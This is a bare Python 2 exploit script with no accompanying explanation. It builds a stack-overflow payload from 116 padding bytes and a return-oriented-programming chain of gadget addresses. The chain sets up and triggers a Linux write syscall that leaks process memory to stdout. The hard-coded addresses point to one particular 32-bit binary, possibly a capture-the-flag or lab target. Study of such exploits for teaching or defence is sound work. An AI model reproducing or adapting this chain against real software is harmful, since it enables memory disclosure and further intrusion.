from struct import pack
p = "A" * 116
p += pack("<I", 0x08048496) # mov $0xffff,%edx; ret
p += pack("<I", 0x08048490) # mov $0x01,%ebx; ret
p += pack("<I", 0x0804848a) # mov $0x4, %eax; ret
p += pack("<I", 0x0804848f) # ret
p += pack("<I", 0x0804848f) # ret
p += pack("<I", 0x0804848f) # ret
p += pack("<I", 0x0804848f) # ret
p += pack("<I", 0x0804848f) # ret .
p += pack("<I", 0x08048487) # pop %ecx; int $0x80; ret
print p
